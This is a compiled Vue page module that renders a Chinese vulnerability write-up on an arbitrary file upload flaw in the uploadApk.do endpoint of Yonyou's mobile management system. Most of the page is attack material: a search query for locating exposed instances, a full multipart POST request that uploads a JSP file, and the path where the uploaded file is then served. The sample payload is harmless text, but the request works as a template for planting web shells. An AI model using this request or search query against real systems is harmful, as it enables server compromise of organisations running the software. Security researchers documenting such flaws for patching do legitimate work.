import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as d,c as l,a,b as e,d as r,e as o}from"./app-58e4a7d6.js";const s={},c=a("h2",{id:"漏洞描述",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),e(" 漏洞描述")],-1),p={href:"http://uploadApk.do",target:"_blank",rel:"noopener noreferrer"},u=o(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>用友 移动管理系统</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;用友-移动系统管理&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164047741.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server
Connection: close

------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name=&quot;downloadpath&quot;; filename=&quot;a.jsp&quot;
Content-Type: application/msword

hello
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164101589.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/maupload/apk/a.jsp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,11);function m(v,h){const i=t("ExternalLinkIcon");return d(),l("div",null,[c,a("p",null,[e("用友 移动管理系统 "),a("a",p,[e("uploadApk.do"),r(i)]),e(" 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限")]),u])}const g=n(s,[["render",m],["__file","用友 移动管理系统 uploadApk.do 任意文件上传漏洞.html.vue"]]);export{g as default};
